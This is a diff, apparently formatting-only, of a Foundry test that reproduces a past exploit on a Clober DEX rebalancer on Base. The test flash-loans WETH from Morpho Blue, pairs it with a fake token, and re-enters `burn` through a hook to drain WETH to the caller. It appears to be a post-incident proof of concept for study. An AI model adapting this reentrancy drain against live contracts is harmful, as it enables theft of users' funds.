@@ -69,7 +69,7 @@ contract CloberDex is BaseTestWithBalanceLog {
     address public morphoBlue = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
     address public rebalancer = 0x6A0b87D6b74F7D5C92722F6a11714DBeDa9F3895;
     address public attacker = 0x012Fc6377F1c5CCF6e29967Bce52e3629AaA6025;
-    
+
     FakeToken fakeToken;
     uint256 public amountToHack;
     uint256 public rebalancerWETH;
@@ -94,20 +94,35 @@ contract CloberDex is BaseTestWithBalanceLog {
         vm.label(morphoBlue, "Morpho Blue");
         vm.label(rebalancer, "Rebalancer Contract");
         vm.label(address(fakeToken), "Fake Token");
-
     }
 
     function testRealAttacker() public {
-        emit log_named_decimal_uint("The Real Attacker's ETH before the attack:", address(attacker).balance / 1e18, 0);
+        emit log_named_decimal_uint(
+            "The Real Attacker's ETH before the attack:",
+            address(attacker).balance / 1e18,
+            0
+        );
         vm.createSelectFork("base", blocknumToForkFrom + 1);
-        emit log_named_decimal_uint("The Real Attacker's ETH after the attack:", address(attacker).balance / 1e18, 0);
+        emit log_named_decimal_uint(
+            "The Real Attacker's ETH after the attack:",
+            address(attacker).balance / 1e18,
+            0
+        );
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("Attacker ETH Balance Before exploit:", address(msg.sender).balance / 1e18, 0);
+        emit log_named_decimal_uint(
+            "Attacker ETH Balance Before exploit:",
+            address(msg.sender).balance / 1e18,
+            0
+        );
 
         rebalancerWETH = IERC20(weth).balanceOf(rebalancer);
-        emit log_named_decimal_uint("Rebalancer WETH Balance Before exploit:", rebalancerWETH, 18);
+        emit log_named_decimal_uint(
+            "Rebalancer WETH Balance Before exploit:",
+            rebalancerWETH,
+            18
+        );
 
         amountToHack = rebalancerWETH * 2;
 
@@ -115,41 +130,60 @@ contract CloberDex is BaseTestWithBalanceLog {
         console.log("--- Flash Loan and Exploit ---");
         morpho.flashLoan(weth, amountToHack, "0");
 
-        emit log_named_decimal_uint("Exploit Contract WETH Balance After exploit:", IERC20(weth).balanceOf(address(this)) / 1e18, 0);
-        emit log_named_decimal_uint("Rebalancer WETH Balance After exploit:", IERC20(weth).balanceOf(rebalancer), 18);
+        emit log_named_decimal_uint(
+            "Exploit Contract WETH Balance After exploit:",
+            IERC20(weth).balanceOf(address(this)) / 1e18,
+            0
+        );
+        emit log_named_decimal_uint(
+            "Rebalancer WETH Balance After exploit:",
+            IERC20(weth).balanceOf(rebalancer),
+            18
+        );
 
         console.log("--- Withdrawn WETH to ETH ---");
         IERC20(weth).withdraw(rebalancerWETH);
         payable(msg.sender).call{value: rebalancerWETH}("");
-        emit log_named_decimal_uint("Attacker ETH Balance After exploit:", address(msg.sender).balance / 1e18, 0);
+        emit log_named_decimal_uint(
+            "Attacker ETH Balance After exploit:",
+            address(msg.sender).balance / 1e18,
+            0
+        );
     }
 
     function onMorphoFlashLoan(uint256 amount, bytes calldata data) external {
-        IHooks hooksA =IHooks(address(0x0000000000000000000000000000000000000000));
+        IHooks hooksA = IHooks(
+            address(0x0000000000000000000000000000000000000000)
+        );
         Currency baseCurrencyA = Currency.wrap(weth);
         Currency quoteA = Currency.wrap(address(fakeToken));
-        FeePolicy makerPolicyA = FeePolicy.wrap(uint24(888608));
+        FeePolicy makerPolicyA = FeePolicy.wrap(uint24(888_608));
 
         IBookManager.BookKey memory bookKeyA = IBookManager.BookKey({
             base: baseCurrencyA,
             unitSize: 1,
             quote: quoteA,
-            makerPolicy: FeePolicy.wrap(8888608),
+            makerPolicy: FeePolicy.wrap(8_888_608),
             hooks: hooksA,
-            takerPolicy: FeePolicy.wrap(8888708)
+            takerPolicy: FeePolicy.wrap(8_888_708)
         });
 
         IBookManager.BookKey memory bookKeyB = IBookManager.BookKey({
             base: quoteA,
             unitSize: 1,
             quote: baseCurrencyA,
-            makerPolicy: FeePolicy.wrap(8888608),
+            makerPolicy: FeePolicy.wrap(8_888_608),
             hooks: hooksA,
-            takerPolicy: FeePolicy.wrap(8888708)
+            takerPolicy: FeePolicy.wrap(8_888_708)
         });
 
         // 2. Build the pool between WETH and Fake Token
-        bytes32 poolKey = rebalancerContract.open(bookKeyA,bookKeyB,"1",address(this));
+        bytes32 poolKey = rebalancerContract.open(
+            bookKeyA,
+            bookKeyB,
+            "1",
+            address(this)
+        );
 
         // 3. Approve tokens
         fakeToken.approve(rebalancer, type(uint256).max);
@@ -164,18 +198,28 @@ contract CloberDex is BaseTestWithBalanceLog {
         IERC20(weth).approve(morphoBlue, amount);
     }
 
-    function burnHook(address receiver,  bytes32 key, uint256 burnAmount, uint256 lastTotalSupply ) external{
-        if(reEntry == false){
-            reEntry=true;
+    function burnHook(
+        address receiver,
+        bytes32 key,
+        uint256 burnAmount,
+        uint256 lastTotalSupply
+    ) external {
+        if (reEntry == false) {
+            reEntry = true;
             // 6. Extract WETH from the pool again
-            IRebalancer(rebalancer).burn(key,rebalancerWETH,0,0);
+            IRebalancer(rebalancer).burn(key, rebalancerWETH, 0, 0);
         }
     }
-    function mintHook(address receiver,bytes32 key, uint256 amount,uint256 amount2) external{}
+
+    function mintHook(
+        address receiver,
+        bytes32 key,
+        uint256 amount,
+        uint256 amount2
+    ) external {}
 
     fallback() external payable {}
 }
-
 
 contract FakeToken {
     string public name;
@@ -187,9 +231,17 @@ contract FakeToken {
     mapping(address => mapping(address => uint256)) private allowances;
 
     event Transfer(address indexed from, address indexed to, uint256 value);
-    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
 
-    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) {
+    constructor(
+        string memory _name,
+        string memory _symbol,
+        uint256 _initialSupply
+    ) {
         name = _name;
         symbol = _symbol;
         totalSupply = _initialSupply;
@@ -210,7 +262,11 @@ contract FakeToken {
         return true;
     }
 
-    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) public returns (bool) {
         require(allowances[from][msg.sender] >= amount, "Allowance exceeded");
         require(balances[from] >= amount, "Insufficient balance");
         balances[from] -= amount;
@@ -220,7 +276,10 @@ contract FakeToken {
         return true;
     }
 
-    function allowance(address owner, address spender) public view returns (uint256) {
+    function allowance(
+        address owner,
+        address spender
+    ) public view returns (uint256) {
         return allowances[owner][spender];
     }
 }
